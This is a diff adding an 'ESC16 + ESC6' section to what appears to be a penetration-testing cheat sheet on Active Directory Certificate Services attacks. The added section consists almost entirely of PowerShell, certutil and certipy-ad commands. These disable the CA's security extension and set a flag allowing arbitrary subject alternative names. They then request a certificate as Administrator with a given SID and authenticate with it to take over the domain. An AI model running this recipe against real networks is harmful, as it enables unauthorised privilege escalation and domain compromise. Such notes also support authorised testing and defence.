@@ -5173,6 +5173,40 @@ certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -u
 certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
 ```
 
+##### ESC16 + ESC6
+
+###### ESC16: Security Extension Disabled on CA (Globally)
+
+```cmd
+$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "DisableExtensionList", "1.3.6.1.4.1.311.25.2")
+```
+
+```cmd
+certutil -config "<RHOST>\<CA>" -getreg policy\DisableExtensionList
+```
+
+```cmd
+Restart-Service CertSvc
+```
+
+###### ESC6: CA allows SAN specification via request attributes
+
+```cmd
+$CA = New-Object -ComObject CertificateAuthority.Admin;$Config = "<RHOST>\<CA>";$newFlags = 0x11014e -bor 0x40000;$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $newFlags)
+```
+
+```cmd
+Restart-Service CertSvc
+```
+
+```shell
+certipy-ad req -u '<USERNAME>' -p '<PASSWORD>' -dc-ip <RHOST> -ca '<CA>' -template 'User' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
+```
+
+```shell
+certipy-ad auth -pfx 'Administrator.pfx' -dc-ip <RHOST>
+```
+
 ##### Error Handling
 
 ###### Fixing Username or domain is not specified, and identity information was not found in the certificate Error
